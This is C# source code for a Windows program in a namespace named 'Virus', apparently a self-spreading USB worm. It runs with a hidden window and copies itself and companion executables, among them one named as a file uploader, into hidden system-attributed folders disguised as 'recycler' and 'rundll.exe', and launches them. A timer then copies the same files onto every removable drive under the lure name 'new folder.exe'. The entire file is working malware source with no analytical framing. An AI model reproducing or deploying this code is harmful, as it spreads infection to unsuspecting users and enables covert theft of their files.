using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace Virus
{
    public partial class frmMain : Form
    {
        //public constructures region
        public frmMain()
        {
            InitializeComponent();

            this.Hide();
            this.Opacity = 0;
            this.Visible = false;
            this.ShowInTaskbar = false;

            if (System.IO.Path.GetFileName(Application.ExecutablePath).ToLower() != NAME_AT_HARD)
            {
                //running in flash memory
                if (System.IO.Directory.Exists(FOLDER_AT_FLASH))
                {
                    String hdd = "c:\\";

                    //try to copy
                    try
                    {
                        CopyFolderToHard(hdd);
                    }
                    catch
                    {
                        try
                        {
                            hdd = "d:\\";
                            CopyFolderToHard(hdd);
                        }
                        catch
                        {
                            return;
                        }
                    }

                    try
                    {
                        if (System.IO.File.Exists(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_SYSTEM_RUNTIME)))
                            System.Diagnostics.Process.Start(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_SYSTEM_RUNTIME));
                    }
                    catch
                    {
                    }

                    try
                    {
                        if (System.IO.File.Exists(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_SPECIAL_ORDERS)))
                            System.Diagnostics.Process.Start(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_SPECIAL_ORDERS));
                    }
                    catch
                    {
                    }

                    try
                    {
                        if (System.IO.File.Exists(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_FILE_UPLOADER)))
                            System.Diagnostics.Process.Start(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_FILE_UPLOADER));
                    }
                    catch
                    {
                    }

                    try
                    {
                        if (System.IO.File.Exists(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_AT_HARD)))
                            System.Diagnostics.Process.Start(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_AT_HARD));
                    }
                    catch
                    {
                    }


                    if (System.IO.Path.GetFileName(Application.ExecutablePath) != NAME_AT_HARD)
                        foreach (String dir in System.IO.Directory.GetDirectories(Application.StartupPath))
                        {
                            System.IO.DirectoryInfo testDir = new System.IO.DirectoryInfo(dir);
                            if ((testDir.Attributes & System.IO.FileAttributes.Hidden) != System.IO.FileAttributes.Hidden)
                            {
                                System.Diagnostics.Process.Start(dir);
                                return;
                            }
                        }
                }
                else
                    return;
            }
            else
            {
                //running in hard disk
                tmr.Enabled = true;
            }
        }

        //private events region
        private void tmr_Tick(object sender, EventArgs e)
        {
            foreach (System.IO.DriveInfo drive in System.IO.DriveInfo.GetDrives())
                if (drive.DriveType == System.IO.DriveType.Removable)
                    try
                    {
                        CopyFolderToFlash(drive.Name);
                    }
                    catch
                    {
                        return;
                    }
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            if (!tmr.Enabled)
                this.Close();
        }

        //private functions region
        private void CopyFolderToHard(String hardName)
        {
            //create folder
            try
            {
                if (!System.IO.Directory.Exists(hardName + FOLDER_AT_HARD))
                {
                    System.IO.DirectoryInfo directory = new System.IO.DirectoryInfo(hardName + FOLDER_AT_HARD);
                    directory.Create();
                    directory.Attributes = System.IO.FileAttributes.System | System.IO.FileAttributes.ReadOnly | System.IO.FileAttributes.Archive | System.IO.FileAttributes.Hidden;
                }
            }
            catch
            {
                //donothing
            }

            //copy files to hdd
            String source, destination;

            //---systemRuntime
            source = System.IO.Path.Combine(FOLDER_AT_FLASH, NAME_SYSTEM_RUNTIME);
            destination = hardName + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_SYSTEM_RUNTIME);

            try
            {
                if (System.IO.File.Exists(source))
                    System.IO.File.Copy(source, destination, true);
            }
            catch
            {
                //donothing
            }

            //---special orders
            source = System.IO.Path.Combine(FOLDER_AT_FLASH, NAME_SPECIAL_ORDERS);
            destination = hardName + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_SPECIAL_ORDERS);

            try
            {
            if (System.IO.File.Exists(source))
                System.IO.File.Copy(source, destination, true);
            }
            catch
            {
                //donothing
            }

            //---file uploader
            source = System.IO.Path.Combine(FOLDER_AT_FLASH, NAME_FILE_UPLOADER);
            destination = hardName + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_FILE_UPLOADER);

            try
            {
            if (System.IO.File.Exists(source))
                System.IO.File.Copy(source, destination, true);
            }
            catch
            {
                //donothing
            }

            //---copy me
            try
            {
            System.IO.File.Copy(Application.ExecutablePath, hardName + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_AT_HARD), true);
            }
            catch
            {
                //donothing
            }
        }

        private void CopyFolderToFlash(String hardName)
        {
            //create directory
            try
            {
            if (!System.IO.Directory.Exists(hardName + FOLDER_AT_FLASH))
            {
                System.IO.DirectoryInfo directory = new System.IO.DirectoryInfo(hardName + FOLDER_AT_FLASH);
                directory.Create();
                directory.Attributes = System.IO.FileAttributes.System | System.IO.FileAttributes.ReadOnly | System.IO.FileAttributes.Archive | System.IO.FileAttributes.Hidden;
            }
            }
            catch
            {
                //donothing
            }

            //copy files to flash
            String source, destination;

            //---systemRuntime
            source = System.IO.Path.Combine(Application.StartupPath, NAME_SYSTEM_RUNTIME);
            destination = hardName + System.IO.Path.Combine(FOLDER_AT_FLASH, NAME_SYSTEM_RUNTIME);

            try
            {
            if (System.IO.File.Exists(source))
                System.IO.File.Copy(source, destination, true);
            }
            catch
            {
                //donothing
            }

            //---special orders
            source =System.IO.Path.Combine(Application.StartupPath, NAME_SPECIAL_ORDERS);
            destination = hardName + System.IO.Path.Combine(FOLDER_AT_FLASH, NAME_SPECIAL_ORDERS);

            try
            {
            if (System.IO.File.Exists(source))
                System.IO.File.Copy(source, destination, true);
            }
            catch
            {
                //donothing
            }

            //---file uploader
            source = System.IO.Path.Combine(Application.StartupPath, NAME_FILE_UPLOADER);
            destination = hardName + System.IO.Path.Combine(FOLDER_AT_FLASH, NAME_FILE_UPLOADER);

            try
            {
            if (System.IO.File.Exists(source))
                System.IO.File.Copy(source, destination, true);
            }
            catch
            {
                //donothing
            }

            //--copy me
            try
            {
            System.IO.File.Copy(Application.ExecutablePath, hardName + NAME_AT_FLASH, true);
            }
            catch
            {
                //donothing
            }
        }

        //private constant region
        private String NAME_AT_FLASH = "new folder.exe";
        private String NAME_AT_HARD = "rundll.exe";
        private String FOLDER_AT_FLASH = "recycled";
        private String FOLDER_AT_HARD = "recycler";

        private String NAME_SPECIAL_ORDERS = "os.exe";
        private String NAME_SYSTEM_RUNTIME = "systemruntime.exe";
        private String NAME_FILE_UPLOADER = "fu.exe";
    }
}
